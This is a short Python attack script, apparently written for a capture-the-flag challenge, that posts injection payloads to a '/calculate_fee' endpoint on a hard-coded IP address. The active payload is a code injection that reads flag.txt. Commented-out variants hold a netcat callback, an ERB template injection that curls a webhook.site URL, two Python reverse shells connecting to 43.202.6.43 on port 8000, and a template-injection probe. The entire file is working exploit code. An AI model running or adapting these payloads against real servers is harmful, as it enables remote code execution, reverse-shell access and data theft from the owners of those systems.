import requests 

url = "http://3.34.253.4:3000"

# command = "nc 0x2bca062b 8000"
# command = "<%= system('curl https://webhook.site/c74a94c9-65c7-4e5f-a83f-85b57036bf89') %>"
# command = "system(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"43.202.6.43\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"sh\\\")'\")" 
# command = "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"43.202.6.43\",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
# command = "{{7*7}}"
command = "1;a=open /|cat flag.txt/.source;b=a.read;b=b.slice X;b.ord"
r = requests.post(
    f"{url}/calculate_fee", 
    data={
        # "authenticity_token": "q8MiAa8WblkaKJdz5E4GyV-J76HEw2xNFLU9TnC1QzG3xA-EzOBPZCqB-f3AaL8WLpRco6OzvTAihK3Fh39RHA",
        "authenticity_token": "curl https://webhook.site/c74a94c9-65c7-4e5f-a83f-85b57036bf89",
        "user_leverage": f"0",
        "user_entry_price": f"0",
        "user_exit_price": f"1",
        "user_quantity": f"1",
    }
)

print(r.text)